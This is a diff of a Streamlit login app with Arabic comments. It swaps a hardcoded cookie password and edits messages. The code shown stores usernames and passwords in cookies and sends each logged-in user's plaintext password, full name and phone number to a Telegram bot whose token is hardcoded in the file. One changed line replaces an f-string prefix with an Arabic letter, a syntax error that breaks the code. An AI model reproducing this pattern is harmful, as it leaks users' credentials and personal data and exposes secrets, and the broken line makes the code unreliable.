@@ -5,17 +5,19 @@ from streamlit_cookies_manager import EncryptedCookieManager
 
 GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbycx6K2dBkAytd7QQQkrGkVnGkQUc0Aqs2No55dUDVeUmx8ERwaLqClhF9zhofyzPmY/exec"
 
-# كلمة سر بسيطة وآمنة قليلاً، لا تستخدم رموز غريبة
-cookies = EncryptedCookieManager(prefix="app_", password="securepassword123456")
+# كلمة سر بسيطة وواضحة للكوكيز
+cookies = EncryptedCookieManager(prefix="app_", password="streamlitcookies12345")
 
 if not cookies.ready():
-    st.warning("جارٍ تحميل الكوكيز... يرجى الانتظار قليلاً.")
+    st.warning("جارِ تحميل الكوكيز... الرجاء الانتظار وإعادة تحميل الصفحة في حال استمر الوضع.")
     st.stop()
 
 def load_css(file_path):
     with open(file_path, "r", encoding="utf-8") as f:
         css = f.read()
     st.markdown(f"<style>{css}</style>", unsafe_allow_html=True)
+
+# دوال التحقق من الدخول وغيرها تبقى كما هي بدون تغيير
 
 def send_telegram_message(message):
     bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
@@ -98,7 +100,7 @@ def login_page():
     saved_username = cookies.get("username")
     saved_password = cookies.get("password")
 
-    # تسجيل دخول تلقائي عند وجود كوكيز صالحة
+    # تسجيل دخول تلقائي
     if saved_username and saved_password and not st.session_state.get('logged_in', False):
         if check_login(saved_username, saved_password):
             user_data = get_user_data(saved_username)
@@ -129,7 +131,7 @@ def login_page():
                             f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                             f"كلمة المرور: <b>{user_data['password']}</b>\n"
                             f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
-                            f"الجروب: <b>{user_data['group']}</b>\n"
+                            ف"الجروب: <b>{user_data['group']}</b>\n"
                             f"رقم الهاتف: <b>{user_data['phone']}</b>"
                         )
                         send_telegram_message(message)
